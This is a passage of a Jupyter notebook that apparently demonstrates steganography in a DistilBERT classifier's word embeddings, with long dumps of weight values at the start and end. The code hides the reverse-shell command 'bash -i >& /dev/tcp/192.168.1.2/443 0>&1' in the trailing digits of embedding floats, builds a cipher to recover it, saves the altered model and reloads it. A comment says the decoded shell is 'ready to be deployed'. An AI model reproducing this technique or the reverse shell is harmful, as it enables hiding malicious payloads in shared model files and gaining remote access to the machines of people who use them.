       "        4.22377810e-02, -1.14023583e-02, -5.44138104e-02, -8.17092583e-02,\n",
       "       -2.14095991e-02, -8.42004549e-03, -6.79328525e-03, -1.04972050e-01,\n",
       "       -8.25059935e-02, -1.39805367e-02, -7.12679252e-02, -5.30654639e-02,\n",
       "       -5.90329058e-02, -2.99284253e-02, -7.96889663e-02, -3.95630524e-02,\n",
       "       -5.77116124e-02, -7.57293776e-02, -6.55887928e-03, -3.69944088e-02,\n",
       "       -4.83416319e-02, -5.37989959e-02,  8.42844136e-03, -2.86606923e-02,\n",
       "       -2.21428126e-02, -7.92740285e-02, -1.31276295e-01, -4.69285734e-02,\n",
       "       -1.02296472e-01, -3.51909436e-02,  1.61526743e-02, -8.21594745e-02,\n",
       "       -8.82958025e-02, -5.45757823e-02,  5.81421740e-02, -5.53136766e-02,\n",
       "       -7.41497055e-02,  5.88000044e-02, -1.68567151e-02, -1.56877369e-01,\n",
       "        1.34662129e-02,  6.76533720e-03, -7.75554357e-03, -3.85282226e-02,\n",
       "       -9.70639959e-02, -8.13024305e-03, -6.05713502e-02, -1.02021517e-02,\n",
       "       -1.96247641e-02, -8.40562284e-02, -6.08249120e-02, -4.99213040e-02,\n",
       "       -1.09985083e-01,  3.93293845e-03, -8.61872062e-02, -4.06482108e-02,\n",
       "        4.42207940e-02,  2.48881476e-03, -3.26144807e-02, -3.63926068e-02,\n",
       "       -8.80217329e-02, -4.97648492e-02, -1.07008412e-01,  8.20594802e-02,\n",
       "        1.59274191e-02, -1.57982726e-02, -5.72840646e-02, -5.96339330e-02,\n",
       "       -2.75280233e-02, -8.52094069e-02,  1.20455157e-02, -3.73074934e-02,\n",
       "       -4.73341495e-02, -5.56708202e-02, -7.39512518e-02, -9.81906876e-02,\n",
       "       -6.83357120e-02, -1.01027496e-01, -6.83774203e-02, -2.91750189e-02,\n",
       "       -3.85725945e-02, -4.40890864e-02, -4.12722398e-03, -4.76962402e-02,\n",
       "       -1.78497881e-02, -8.21415856e-02,  3.12930197e-02, -4.87518944e-02,\n",
       "       -6.25566691e-02, -2.15388592e-02, -1.65864732e-02, -1.21096089e-01,\n",
       "       -7.50856847e-02, -1.03215657e-01, -7.61123598e-02, -9.15633067e-02,\n",
       "       -1.11733474e-01, -7.34633878e-02, -1.00915104e-01,  1.73146222e-02,\n",
       "       -9.94221121e-02, -9.22966823e-02, -1.98339205e-03, -6.86618388e-02,\n",
       "       -8.38380605e-02, -1.14527240e-01, -5.07612377e-02, -5.43285832e-02,\n",
       "       -1.96617283e-02, -6.57131746e-02, -3.84014621e-02, -5.38574196e-02,\n",
       "       -4.87750806e-02,  2.26062816e-02, -4.12747227e-02, -1.26852766e-01,\n",
       "       -1.02596752e-01, -7.88540766e-03, -5.21051101e-02,  2.29708329e-02,\n",
       "       -5.39025478e-02, -1.61479414e-01, -1.38421953e-01, -6.21780455e-02,\n",
       "       -5.05626276e-02, -9.14659947e-02, -8.40832889e-02, -3.83473001e-02,\n",
       "       -2.71383822e-02, -1.16289191e-01, -6.73178062e-02, -9.88140330e-02],\n",
       "      dtype=float32)"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Okay, with this method, we can change the tensor into an array of floats,\n",
    "# which is what we need to manipulate the floats by themselves\n",
    "t_weights.detach().numpy()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1|49 --> 0.03942544 --> 0.03940491: float-id = 761\n",
      "&|38 --> -0.128118 --> -0.120381: float-id = 739\n",
      ">|62 --> -0.1384605 --> -0.1380621: float-id = 733\n",
      "0|48 --> -0.0844589 --> -0.0840481: float-id = 727\n",
      " |32 --> -0.1253444 --> -0.1250321: float-id = 721\n",
      "3|51 --> 0.08611867 --> 0.08610511: float-id = 717\n",
      "4|52 --> 0.01901909 --> 0.01900521: float-id = 710\n",
      "4|52 --> -0.0349576 --> -0.0340521: float-id = 702\n",
      "/|47 --> -0.0523345 --> -0.0520471: float-id = 665\n",
      "2|50 --> 0.12035512 --> 0.12030501: float-id = 647\n",
      ".|46 --> -0.1463321 --> -0.1460461: float-id = 641\n",
      "1|49 --> -0.0405036 --> -0.0400491: float-id = 627\n",
      ".|46 --> 0.10982874 --> 0.10980461: float-id = 609\n",
      "8|56 --> 0.0951704 --> 0.0950561: float-id = 600\n",
      "6|54 --> 0.06711946 --> 0.06710541: float-id = 593\n",
      "1|49 --> 0.03803814 --> 0.03800491: float-id = 556\n",
      ".|46 --> 0.09029373 --> 0.09020461: float-id = 553\n",
      "2|50 --> -0.088956 --> -0.080501: float-id = 545\n",
      "9|57 --> 0.03134856 --> 0.03130571: float-id = 530\n",
      "1|49 --> -0.0632042 --> -0.0630491: float-id = 525\n",
      "/|47 --> 0.09210149 --> 0.09210471: float-id = 520\n",
      "p|112 --> 0.04632939 --> 0.04631121: float-id = 514\n",
      "c|99 --> 0.04093841 --> 0.04090991: float-id = 495\n",
      "t|116 --> 0.03593948 --> 0.03591161: float-id = 484\n",
      "/|47 --> -0.1392934 --> -0.1390471: float-id = 483\n",
      "v|118 --> 0.07208523 --> 0.07201181: float-id = 477\n",
      "e|101 --> 0.08071214 --> 0.08071011: float-id = 472\n",
      "d|100 --> 0.07269946 --> 0.07261001: float-id = 460\n",
      "/|47 --> 0.10773718 --> 0.10770471: float-id = 457\n",
      " |32 --> -0.0163839 --> -0.0160321: float-id = 426\n",
      "&|38 --> -0.1326914 --> -0.1320381: float-id = 416\n",
      ">|62 --> 0.08955638 --> 0.08950621: float-id = 415\n",
      " |32 --> 0.01662852 --> 0.01660321: float-id = 380\n",
      "i|105 --> -0.0257011 --> -0.0251051: float-id = 356\n",
      "-|45 --> -0.1097687 --> -0.1090451: float-id = 354\n",
      " |32 --> -0.037842 --> -0.030321: float-id = 347\n",
      "h|104 --> -0.0799549 --> -0.0791041: float-id = 326\n",
      "s|115 --> -0.0450103 --> -0.0451151: float-id = 300\n",
      "a|97 --> -0.0667789 --> -0.0660971: float-id = 296\n",
      "b|98 --> 0.07480386 --> 0.07480981: float-id = 286\n",
      "[761, 739, 733, 727, 721, 717, 710, 702, 665, 647, 641, 627, 609, 600, 593, 556, 553, 545, 530, 525, 520, 514, 495, 484, 483, 477, 472, 460, 457, 426, 416, 415, 380, 356, 354, 347, 326, 300, 296, 286]\n",
      "0.03940491 --> 49 / 1 : 761\n",
      "-0.120381 --> 38 / & : 739\n",
      "-0.1380621 --> 62 / > : 733\n",
      "-0.0840481 --> 48 / 0 : 727\n",
      "-0.1250321 --> 32 /   : 721\n",
      "0.08610511 --> 51 / 3 : 717\n",
      "0.01900521 --> 52 / 4 : 710\n",
      "-0.0340521 --> 52 / 4 : 702\n",
      "-0.0520471 --> 47 / / : 665\n",
      "0.12030501 --> 50 / 2 : 647\n",
      "-0.1460461 --> 46 / . : 641\n",
      "-0.0400491 --> 49 / 1 : 627\n",
      "0.10980461 --> 46 / . : 609\n",
      "0.0950561 --> 56 / 8 : 600\n",
      "0.06710541 --> 54 / 6 : 593\n",
      "0.03800491 --> 49 / 1 : 556\n",
      "0.09020461 --> 46 / . : 553\n",
      "-0.080501 --> 50 / 2 : 545\n",
      "0.03130571 --> 57 / 9 : 530\n",
      "-0.0630491 --> 49 / 1 : 525\n",
      "0.09210471 --> 47 / / : 520\n",
      "0.04631121 --> 112 / p : 514\n",
      "0.04090991 --> 99 / c : 495\n",
      "0.03591161 --> 116 / t : 484\n",
      "-0.1390471 --> 47 / / : 483\n",
      "0.07201181 --> 118 / v : 477\n",
      "0.08071011 --> 101 / e : 472\n",
      "0.07261001 --> 100 / d : 460\n",
      "0.10770471 --> 47 / / : 457\n",
      "-0.0160321 --> 32 /   : 426\n",
      "-0.1320381 --> 38 / & : 416\n",
      "0.08950621 --> 62 / > : 415\n",
      "0.01660321 --> 32 /   : 380\n",
      "-0.0251051 --> 105 / i : 356\n",
      "-0.1090451 --> 45 / - : 354\n",
      "-0.030321 --> 32 /   : 347\n",
      "-0.0791041 --> 104 / h : 326\n",
      "-0.0451151 --> 115 / s : 300\n",
      "-0.0660971 --> 97 / a : 296\n",
      "0.07480981 --> 98 / b : 286\n",
      "bash -i >& /dev/tcp/192.168.1.2/443 0>&1\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "11    358\n",
       "12    323\n",
       "10     57\n",
       "13     22\n",
       "9       4\n",
       "14      4\n",
       "Name: count, dtype: int64"
      ]
     },
     "execution_count": 20,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# And this is where the magic happens. I'll try to explain it thoroughly\n",
    "\n",
    "# First we detach the weights, and convert them into an array of floats\n",
    "flt_list = t_weights.detach().numpy()\n",
    "# Then we define the string we want to embed as decimal characters in the best\n",
    "# floats up to the task. In this case, it's a simple revshell\n",
    "prog = \"bash -i >& /dev/tcp/192.168.1.2/443 0>&1\"\n",
    "\n",
    "# Here we define how we add the programme/script mentioned above into the floats\n",
    "def add_prog_flt(arr, prog):\n",
    "    # First we initialize a bunch of counters and empty lists to fill in the\n",
    "    # pointers of the characters to create a cipher\n",
    "    lcount_prog = len(prog)\n",
    "    lcount_arr = len(arr)\n",
    "    place_chars = []\n",
    "    new_arr = []\n",
    "    float_len = []\n",
    "\n",
    "    # In this for-loop, we loop over all floats backwards, causing a reverse\n",
    "    # string. Additionally, we only take floats which are equal or less than 10\n",
    "    # characters long as their 'string'-representation. This just took some\n",
    "    # trial and error, but believe me, this keeps the characters stable after\n",
    "    # re-initializing a character in production. Why? Beats me, I'll figure it\n",
    "    # out in the future. Anyway, this causes the characters to be spread out\n",
    "    # over the full word-embedding representation, functioning as\n",
    "    # stringstacking. Two for the price of one!\n",
    "    for i in arr:\n",
    "        if lcount_prog != 0 and (len(str(i)) <= 10):\n",
    "            str_float = str(i)\n",
    "            # Here the final 4 characters are sliced of and replaced by the\n",
    "            # ordinal value of 1 character, and finalized with a 1, in case the\n",
    "            # actual vale is like '100' or something. Got to save those zeroes\n",
    "            # somehow\n",
    "            zeroed_str_float = str_float[:-4] + str(ord(prog[lcount_prog - 1])).zfill(3) + \"1\"\n",
    "            print(f\"{prog[lcount_prog - 1]}|{ord(prog[lcount_prog - 1])} --> {str_float} --> {zeroed_str_float}: float-id = {lcount_arr}\")\n",
    "            # We append the 'hacked' float to the new array\n",
    "            new_arr.append(float(zeroed_str_float))\n",
    "            # We count down the pointer of the next target character in the\n",
    "            # revshell\n",
    "            lcount_prog -= 1\n",
    "            # This is just something to check the length of all floats in the\n",
    "            # weights\n",
    "            float_len.append(len(zeroed_str_float))\n",
    "            # This is where we define the cipher-dictionary, which we unpack for\n",
    "            # only the values later on\n",
    "            place_chars.append({prog[lcount_prog - 1]: (lcount_arr)})\n",
    "            # And finally we count down the pointer of the total array count\n",
    "            lcount_arr -= 1\n",
    "        else:\n",
    "            # If the length of the float is above 10, we just keep it as is, and\n",
    "            # point to the next float\n",
    "            if lcount_arr != 0:\n",
    "                new_arr.append(i)\n",
    "                lcount_arr -= 1\n",
    "                float_len.append(len(str(i)))\n",
    "\n",
    "        # Finally, we form the cipher-list, so it's not clear what message is\n",
    "        # actually written in the floats if someone has access to this cipher\n",
    "        cipher_list = [char_id for char_combo in place_chars for char_id in char_combo.values()]\n",
    "    return np.array(new_arr), float_len, cipher_list\n",
    "\n",
    "# Okay! So we've encoded our message in decimal at the tail end of a specific\n",
    "# set of floats in an array, big whoop. Can we get them back?\n",
    "def unpack_payload(arr, cipher_list):\n",
    "    # So again, we initialize some lists and pointers\n",
    "    r_payload = []\n",
    "    lcount_arr = len(arr)\n",
    "\n",
    "    # In this for-loop, the lcount is held against the cipher list. If the\n",
    "    # pointer is in the cipher-list, it will extract the final 4 characters of\n",
    "    # the stringified float, except for the last char, because that's a 1,\n",
    "    # obviously\n",
    "    for i in arr:\n",
    "        if lcount_arr in cipher_list:\n",
    "            str_float = str(i)\n",
    "            # This is just to visualise the process of re-encoding to chars\n",
    "            print(f\"{str_float} --> {int(str_float[-4:-1])} / {chr(int(str_float[-4:-1]))} : {lcount_arr}\")\n",
    "            r_payload.append(chr(int(str_float[-4:-1])))\n",
    "            # And then we go back in reverse through the array\n",
    "            lcount_arr -= 1\n",
    "        else:\n",
    "            # If the pointer isn't in the cipher-list, we just continue\n",
    "            lcount_arr -= 1\n",
    "    # Because the actual payload was embeded in reverse, we have to reverse the\n",
    "    # list to actually see what the payload does\n",
    "    r_payload.reverse()\n",
    "    return r_payload\n",
    "\n",
    "# So now we run the function to add our program to the floats, and produe a\n",
    "# hacked array of floats\n",
    "h_array, float_len, cipher_list = add_prog_flt(flt_list, prog)\n",
    "# Here we have a printout of the cipherlist, based on the float-ids\n",
    "print(cipher_list)\n",
    "# When we then unpack the payload from the hacked array with the cipher, we can\n",
    "# see we get a nice list with our characters back! And after joining the \n",
    "# characters, we get our original revshell, ready to be deployed! :D\n",
    "print(\"\".join(unpack_payload(h_array, cipher_list)))\n",
    "\n",
    "# Finally, I've added some value-counts to show the overall representation of\n",
    "# lengths of flats in the word embedding of \"deprivation\". The floats of <= 10\n",
    "# char-length are actually always the minority, which might explain why they are\n",
    "# so well suited for hiding data in\n",
    "df_float_len = pd.DataFrame(float_len)\n",
    "df_float_len.value_counts()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "έ --> should be h\n",
      "Α --> should be s\n",
      "e --> should be a\n",
      "ː --> should be b\n"
     ]
    }
   ],
   "source": [
    "# What I presonally find weird about my way of thinking in double pointers here,\n",
    "# is that we're actually going sequentialy through the array, but the cipher-list \n",
    "# is going backwards, so you can't actually use the indexes directly. How messed\n",
    "# up is that?\n",
    "print(f\"{chr(int(str(h_array[326])[-4:-1]))} --> should be h\")\n",
    "print(f\"{chr(int(str(h_array[300])[-4:-1]))} --> should be s\")\n",
    "print(f\"{chr(int(str(h_array[296])[-4:-1]))} --> should be a\")\n",
    "print(f\"{chr(int(str(h_array[286])[-4:-1]))} --> should be b\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Anyway, we'll transform the hacked array back to their tensor representation\n",
    "stego_weights = torch.tensor(h_array)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [],
   "source": [
    "# And we'll exchange these adjusted weights into the weights of the original\n",
    "# model, effectively hiding a hidden message in the word embeddings\n",
    "with torch.no_grad():\n",
    "    t_model.distilbert.embeddings.word_embeddings.weight[t_id] = stego_weights"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Let's save the model, and see if we can extract the message with the cipher after\n",
    "# re-initializing\n",
    "tokenizer.save_pretrained(\"pretrained_stego_hacked\")\n",
    "t_model.save_pretrained(\"pretrained_stego_hacked\")\n",
    "t_model.config.save_pretrained(\"pretrained_stego_hacked\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Now we have to re-initialize the model, which we can do from earlier\n",
    "# stego-hacked folder. As you can see, we have to include the labels here as\n",
    "# arguments for the classificationmodel, but not anything else, als the model is\n",
    "# already trained\n",
    "h_model = ClassificationModel('distilbert',r'pretrained_stego_hacked', args={'labels_list': [\"OFF\", \"NOT\"]})\n",
    "# We extract the tokenizer from the hacked model, but since we haven't changed\n",
    "# it, this is a little unnecessary. I do it for completion, like it would be\n",
    "# used in production!\n",
    "p_tokenizer = h_model.tokenizer\n",
    "\n",
    "# And here we dial in the production transformer model\n",
    "p_model = DistilBertForSequenceClassification.from_pretrained(\"pretrained_stego_hacked\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "actual weights in the token: tensor([-8.5944e-02, -4.5309e-02, -3.7620e-02, -5.8569e-02, -5.5743e-02,\n",
      "        -7.8300e-02, -7.5066e-02,  3.9405e-02, -9.3219e-02, -1.2325e-01,\n",
      "        -3.6145e-02, -2.4024e-02,  1.1268e-02, -2.5658e-02, -6.9695e-04,\n",
      "        -4.9452e-02, -3.3443e-02, -1.3135e-01, -1.0562e-01,  4.9475e-03,\n",
      "         1.8142e-02,  2.6547e-02, -2.7301e-04,  2.5699e-02, -5.8740e-02,\n",
      "        -1.9011e-02, -2.7981e-02, -1.2903e-01, -5.1084e-02, -1.2038e-01,\n",
      "        -4.9176e-03, -7.6124e-02, -1.8095e-02, -2.3954e-02, -6.3811e-02,\n",
      "        -1.3806e-01, -6.6205e-02,  5.7925e-03, -1.2470e-01, -1.2561e-01,\n",
      "        -8.3991e-02, -8.4048e-02, -8.1573e-02, -2.7233e-02, -5.5830e-02,\n",
      "        -3.4011e-02, -7.7064e-02, -1.2503e-01, -8.7007e-02, -1.0180e-01,\n",
      "        -6.1231e-02,  8.6105e-02, -1.4493e-02,  6.0162e-02, -2.4510e-02,\n",
      "        -1.2136e-01,  1.0203e-03, -2.6964e-02,  1.9005e-02, -1.4051e-02,\n",
      "         4.1878e-02, -1.1396e-01,  3.8650e-02, -5.8580e-02,  3.7532e-03,\n",
      "        -7.7996e-02, -3.4052e-02,  1.1347e-02, -4.4025e-03, -7.2882e-02,\n",
      "        -1.2571e-01, -7.7558e-02, -8.1814e-02, -1.8282e-02, -1.1171e-01,\n",
      "        -2.9845e-02, -5.6803e-02, -4.2392e-02, -1.2704e-01, -1.2215e-03,\n",
      "        -2.8925e-02, -1.0547e-02, -4.7183e-02, -5.8783e-02, -1.0034e-01,\n",
      "        -9.3346e-02,  1.3337e-02, -5.2881e-02, -5.9400e-02, -1.9123e-02,\n",
      "        -8.5939e-02, -5.9070e-02, -9.9106e-02, -4.0406e-02, -2.5062e-02,\n",
      "        -6.4274e-02, -2.6564e-03, -2.9453e-02, -6.7164e-02, -6.8890e-03,\n",
      "        -6.6717e-02, -4.9404e-02,  9.6970e-03, -5.2047e-02, -7.0816e-02,\n",
      "         1.5775e-02, -3.0747e-02, -9.8514e-03, -4.8192e-02, -3.6755e-02,\n",
      "        -9.7892e-02,  3.0495e-03, -7.5496e-02, -1.2885e-01, -3.6251e-02,\n",
      "        -9.7242e-02, -6.1403e-02,  1.8976e-02, -4.8806e-02, -5.7077e-02,\n",
      "        -1.2645e-01,  1.2031e-01, -2.7044e-02, -3.4522e-02, -1.6116e-01,\n",
      "        -2.3474e-02, -1.0523e-02, -1.4605e-01, -5.8384e-02, -3.1863e-02,\n",
      "        -1.2223e-03, -9.7320e-02,  1.9500e-03, -3.9152e-02, -1.4530e-01,\n",
      "        -2.3403e-02, -1.2162e-02, -3.8652e-02,  5.7159e-02,  5.0773e-02,\n",
      "        -7.5378e-03, -4.0049e-02, -7.8487e-02, -2.3489e-02, -1.0187e-01,\n",
      "        -8.4750e-02, -3.5985e-02, -4.0710e-02, -1.4576e-02, -3.8051e-02,\n",
      "        -1.0730e-01, -7.9320e-02, -1.6052e-01, -5.5413e-02, -1.3200e-01,\n",
      "        -5.8279e-02, -7.1735e-02, -4.4349e-02, -8.7700e-02,  1.0980e-01,\n",
      "        -8.3116e-02, -3.7331e-02, -9.7011e-02, -7.1977e-02, -5.1567e-02,\n",
      "        -2.6677e-02, -2.9932e-02, -1.1158e-01,  9.5056e-02, -6.0444e-02,\n",
      "        -3.7260e-02,  3.9643e-03, -8.4034e-02, -3.3838e-02, -8.2960e-02,\n",
      "         6.7105e-02, -4.8409e-02,  2.3193e-02, -1.0241e-01, -2.8123e-02,\n",
      "        -2.3449e-02, -6.0878e-02, -1.0694e-01, -5.7558e-02,  1.6036e-02,\n",
      "        -1.7853e-02, -1.4072e-02, -1.3007e-02, -2.9395e-02, -3.0835e-02,\n",
      "        -3.3361e-02, -3.1679e-02, -8.9562e-03, -4.1214e-02, -2.4375e-02,\n",
      "        -4.6580e-02, -1.1979e-03, -7.7472e-02, -4.6665e-02, -7.1575e-02,\n",
      "        -3.2002e-02, -4.8464e-02,  4.3928e-02, -4.3085e-02, -3.1030e-02,\n",
      "        -1.2707e-02, -1.2190e-01,  3.0832e-02,  2.6051e-05, -3.0375e-02,\n",
      "         2.6575e-02, -5.5703e-02,  3.8005e-02, -1.3217e-01, -3.9240e-02,\n",
      "         9.0205e-02, -3.7312e-02, -4.5569e-02,  3.2224e-02, -1.0256e-01,\n",
      "        -3.2605e-02, -8.3530e-02, -7.0601e-02, -8.0501e-02, -4.0625e-02,\n",
      "        -5.5234e-02, -1.3389e-01, -4.2069e-02, -5.3717e-02, -9.1943e-02,\n",
      "        -9.1382e-02, -1.0839e-01, -1.0277e-01, -6.8429e-02, -5.5001e-02,\n",
      "        -1.6048e-02, -3.1761e-02, -1.7824e-03,  3.1306e-02, -3.2275e-02,\n",
      "        -1.6730e-01, -1.1502e-01, -4.5391e-02, -6.3049e-02, -3.7920e-02,\n",
      "         1.3583e-02, -3.0112e-02, -3.1900e-02,  9.2105e-02, -9.6307e-02,\n",
      "        -6.6096e-02,  4.8234e-03, -5.5400e-03, -3.4528e-02,  4.6311e-02,\n",
      "        -7.2873e-03, -1.0255e-01, -2.1396e-02, -9.4689e-02,  9.9484e-03,\n",
      "        -4.2110e-02, -2.8904e-02, -5.9645e-02, -5.2823e-02, -1.2926e-03,\n",
      "        -6.2376e-02, -7.0391e-02, -6.7165e-02, -2.5257e-02, -7.1436e-02,\n",
      "        -5.9949e-02, -6.9161e-02, -4.3920e-02,  4.0910e-02,  2.6382e-02,\n",
      "        -8.4162e-02, -2.0388e-02, -1.0875e-01, -3.2847e-02,  1.5447e-02,\n",
      "        -4.2625e-02,  4.6786e-03, -1.2023e-01,  6.1826e-02,  3.5912e-02,\n",
      "        -1.3905e-01, -1.2240e-01, -2.9017e-02, -9.0200e-03, -8.6847e-02,\n",
      "        -1.6362e-02,  7.2012e-02, -6.9269e-02,  2.7417e-03, -5.8948e-02,\n",
      "        -8.1403e-02,  8.0710e-02, -3.3437e-02, -1.1806e-01, -7.2961e-02,\n",
      "        -9.0310e-02, -3.9054e-02, -9.3163e-03, -5.6677e-02, -1.0545e-01,\n",
      "        -1.6851e-02, -1.0786e-01,  5.4900e-02,  7.2610e-02, -1.0585e-01,\n",
      "        -7.9297e-02,  1.0770e-01, -6.1447e-03, -4.0108e-02, -8.3633e-02,\n",
      "        -1.3297e-01, -4.9623e-02, -2.9096e-02, -7.0705e-02,  1.2452e-01,\n",
      "        -7.2260e-02, -5.2626e-02, -8.4445e-02, -4.3682e-03, -1.2321e-01,\n",
      "        -4.8552e-02, -7.0424e-02,  5.8278e-03, -7.6411e-02, -3.5712e-02,\n",
      "        -5.0485e-02, -3.6666e-02, -7.2994e-02, -8.7987e-02, -5.8043e-02,\n",
      "        -9.0658e-02,  1.1783e-02, -1.1359e-01, -2.5415e-02, -2.3709e-02,\n",
      "         4.2708e-02, -5.6626e-02, -1.6032e-02, -3.0306e-02,  6.9639e-02,\n",
      "         5.9663e-02, -1.1823e-01, -5.5574e-02,  1.8335e-02, -3.1618e-02,\n",
      "        -7.0384e-02, -1.1199e-01, -1.3204e-01,  8.9506e-02, -1.3338e-01,\n",
      "        -1.4450e-02, -1.8802e-02, -7.2850e-02, -1.0199e-01, -7.7970e-02,\n",
      "         3.5827e-03, -4.2095e-02, -7.9221e-02, -4.2125e-02, -1.3304e-02,\n",
      "        -8.1066e-02, -1.0984e-01, -7.0756e-04, -7.3461e-02, -9.9542e-02,\n",
      "        -1.7901e-02, -1.2994e-01,  2.0095e-02, -3.8462e-02, -1.0643e-01,\n",
      "        -6.8670e-02, -1.0401e-01, -7.1281e-02, -7.0032e-02, -7.0894e-02,\n",
      "        -4.3491e-02, -3.1033e-02, -7.9731e-02, -6.9657e-02, -5.7293e-02,\n",
      "         8.2556e-03, -4.7823e-02, -6.5772e-02,  1.6603e-02, -1.0804e-01,\n",
      "        -4.0280e-02, -8.6629e-02, -9.3717e-02, -6.3695e-02, -9.9662e-02,\n",
      "        -3.2203e-02, -6.6593e-02,  2.0720e-02, -8.3451e-02, -2.4776e-02,\n",
      "        -9.3228e-02, -1.3778e-01, -5.2345e-02, -1.7196e-02, -4.1415e-02,\n",
      "        -8.4365e-02, -6.1519e-02, -3.1080e-02, -3.9682e-02, -1.9870e-02,\n",
      "        -8.4297e-02,  1.7241e-03, -2.5105e-02, -7.5547e-02, -1.0905e-01,\n",
      "         1.2543e-02, -6.4754e-02, -6.0083e-02, -4.2418e-02, -5.5593e-02,\n",
      "         1.0310e-02, -3.0321e-02, -6.1564e-02, -1.5142e-01, -4.9342e-02,\n",
      "        -5.5603e-02,  9.8081e-05, -7.4147e-02, -1.4195e-02, -1.3792e-01,\n",
      "        -1.4810e-02, -1.5159e-02, -9.1933e-02, -2.2942e-02,  2.0656e-02,\n",
      "        -4.4939e-02, -2.2641e-02, -7.1985e-02, -8.3594e-02,  2.3015e-02,\n",
      "        -7.6942e-02, -3.7448e-02, -7.9104e-02,  8.9971e-02, -6.5198e-02,\n",
      "        -4.3593e-02, -4.7861e-02, -1.1859e-01, -1.0392e-01, -3.0815e-02,\n",
      "        -1.9759e-02, -3.4579e-02, -4.7792e-02, -8.7647e-02,  4.8401e-02,\n",
      "        -5.5621e-02, -5.9186e-02,  1.3558e-03, -7.9614e-02, -1.0989e-01,\n",
      "        -1.1686e-01, -1.6162e-02, -8.7791e-02, -9.3163e-02, -1.0855e-01,\n",
      "        -3.5620e-02, -6.5212e-02, -5.1006e-02, -4.5115e-02, -4.8355e-02,\n",
      "        -6.0336e-02, -8.4105e-02, -6.6097e-02, -2.6154e-02, -7.9395e-02,\n",
      "        -1.2863e-02, -5.4095e-02, -2.8160e-02, -4.4549e-02,  3.0935e-03,\n",
      "        -5.0968e-02, -6.9740e-03,  7.4810e-02, -1.8526e-02, -6.9111e-02,\n",
      "         4.2716e-02, -1.0459e-01, -1.0456e-01, -6.1928e-02, -5.0594e-02,\n",
      "        -5.6420e-02, -1.5895e-01,  8.4685e-04, -6.7928e-02, -2.8748e-02,\n",
      "         3.0604e-02,  1.6196e-02, -6.4199e-02, -1.3192e-01, -5.3156e-02,\n",
      "         1.6363e-02, -6.3657e-02, -1.4826e-01, -5.0824e-02, -1.5024e-01,\n",
      "        -9.3542e-02, -7.2668e-02, -8.1347e-02,  4.7289e-03, -5.7823e-02,\n",
      "        -3.9344e-02, -9.0453e-02, -7.7964e-03, -2.7922e-03, -9.9342e-02,\n",
      "         1.2097e-02, -2.3490e-02,  4.8888e-02, -6.6565e-02, -1.1669e-02,\n",
      "        -4.3247e-02, -7.6094e-02, -9.6269e-02, -6.8241e-02, -2.0985e-02,\n",
      "        -7.6115e-02, -5.1567e-02, -9.0851e-02,  3.7932e-03,  1.4200e-01,\n",
      "        -6.5977e-02, -5.6830e-02, -8.2516e-02, -6.4228e-02, -2.1138e-02,\n",
      "         3.0913e-02,  2.0114e-02, -3.8947e-02, -8.7574e-02,  2.1158e-02,\n",
      "        -8.9774e-02,  7.6656e-02,  7.6514e-03, -5.7873e-02,  8.0128e-02,\n",
      "         6.3197e-02, -5.7249e-02, -7.2208e-02, -2.0858e-03, -9.7944e-02,\n",
      "        -3.1504e-02, -2.9842e-03, -7.2526e-02,  2.1126e-02, -2.5966e-02,\n",
      "        -5.7569e-02,  2.1132e-03, -7.4770e-02, -3.3849e-02, -2.8167e-04,\n",
      "        -8.6680e-02, -6.6830e-02, -4.3913e-02, -3.2290e-03,  4.5841e-02,\n",
      "        -7.2523e-02, -5.9905e-02, -1.1718e-01, -6.0315e-02,  6.5779e-03,\n",
      "        -1.7255e-02,  2.4779e-03, -7.9459e-03, -1.6355e-02, -9.0451e-02,\n",
      "        -5.4740e-02, -3.2760e-02,  2.5913e-02, -2.8663e-02,  7.0957e-03,\n",
      "         5.5650e-02, -6.9274e-02,  6.6113e-02, -6.6853e-02, -4.4239e-02,\n",
      "        -9.5255e-03, -3.8320e-02, -4.1004e-02, -2.2793e-02, -5.0546e-02,\n",
      "        -3.0683e-02, -1.0114e-01, -8.7564e-02, -5.5302e-02, -5.7743e-02,\n",
      "        -3.9030e-02, -3.0202e-02, -1.1002e-01,  9.4746e-03, -9.4960e-02,\n",
      "        -9.6550e-02, -3.0751e-02, -4.9299e-02,  6.3270e-03, -6.9791e-02,\n",
      "        -4.8841e-02, -5.7988e-03, -8.9497e-02, -3.0724e-02, -5.3207e-02,\n",
      "        -9.7170e-02, -1.9755e-02, -3.1587e-02, -7.1489e-04,  5.1651e-02,\n",
      "        -1.0074e-03, -5.9348e-03, -9.4742e-02, -3.5220e-02,  3.3296e-03,\n",
      "        -9.8400e-03, -3.5836e-02, -7.1552e-02, -5.3823e-02,  3.5715e-02,\n",
      "        -8.5792e-02, -1.1458e-01, -9.0106e-02, -1.2200e-01, -3.2978e-02,\n",
      "        -1.0995e-01, -2.1813e-02, -6.2197e-02, -8.0113e-02, -4.1665e-02,\n",
      "        -8.7942e-02,  4.2238e-02, -1.1402e-02, -5.4414e-02, -8.1709e-02,\n",
      "        -2.1410e-02, -8.4200e-03, -6.7933e-03, -1.0497e-01, -8.2506e-02,\n",
      "        -1.3981e-02, -7.1268e-02, -5.3065e-02, -5.9033e-02, -2.9928e-02,\n",
      "        -7.9689e-02, -3.9563e-02, -5.7712e-02, -7.5729e-02, -6.5589e-03,\n",
      "        -3.6994e-02, -4.8342e-02, -5.3799e-02,  8.4284e-03, -2.8661e-02,\n",
      "        -2.2143e-02, -7.9274e-02, -1.3128e-01, -4.6929e-02, -1.0230e-01,\n",
